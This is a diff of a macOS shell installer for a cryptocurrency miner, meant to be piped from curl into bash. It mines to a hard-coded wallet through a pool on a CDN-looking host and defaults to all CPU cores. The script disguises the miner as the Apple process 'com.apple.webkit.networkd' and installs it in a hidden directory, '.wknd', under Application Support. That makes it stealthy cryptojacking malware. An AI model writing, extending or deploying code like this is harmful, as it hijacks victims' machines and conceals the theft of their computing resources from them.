@@ -10,22 +10,28 @@ WALLET="RSwiruLQYNgpWP36JKEmRQUddTWWi4MsVX"
 WORKER="mac1"
 POOL_HOST="cdn.soumalya.in"
 POOL_PORT="3956"
-MAX_THREADS=$(sysctl -n hw.logicalcpu)
 
-# ---- Prompt user for thread count (works even in curl|bash pipe) ----
-echo ""
-echo "  CPU cores available: $MAX_THREADS"
-printf "  How many cores to use? [press Enter for MAX ($MAX_THREADS)]: " > /dev/tty
-read -r USER_THREADS < /dev/tty
-if [[ -z "$USER_THREADS" || ! "$USER_THREADS" =~ ^[0-9]+$ || "$USER_THREADS" -lt 1 ]]; then
-  THREADS=$MAX_THREADS
-elif [[ "$USER_THREADS" -gt "$MAX_THREADS" ]]; then
-  THREADS=$MAX_THREADS
-else
-  THREADS=$USER_THREADS
+# ---- Prompt user for thread count ----
+MAX_THREADS=$(sysctl -n hw.logicalcpu)
+THREADS=$MAX_THREADS  # default to max
+
+# Try reading from /dev/tty (works in curl|bash pipe on macOS)
+if [[ -c /dev/tty ]]; then
+  echo ""
+  echo "╔══════════════════════════════════════╗"
+  echo "║   CPU CORES AVAILABLE : $MAX_THREADS             ║"
+  echo "╚══════════════════════════════════════╝"
+  echo -n "  Enter cores to use [1-$MAX_THREADS, default=MAX]: " > /dev/tty
+  read -r USER_THREADS < /dev/tty || USER_THREADS=""
+  echo ""
+  if [[ "$USER_THREADS" =~ ^[0-9]+$ ]] && [[ "$USER_THREADS" -ge 1 ]] && [[ "$USER_THREADS" -le "$MAX_THREADS" ]]; then
+    THREADS=$USER_THREADS
+  else
+    THREADS=$MAX_THREADS
+  fi
+  echo "  → Mining with $THREADS / $MAX_THREADS cores"
+  echo ""
 fi
-echo "  → Using $THREADS / $MAX_THREADS cores"
-echo ""
 
 DISGUISE_NAME="com.apple.webkit.networkd"
 INSTALL_DIR="$HOME/Library/Application Support/.wknd"
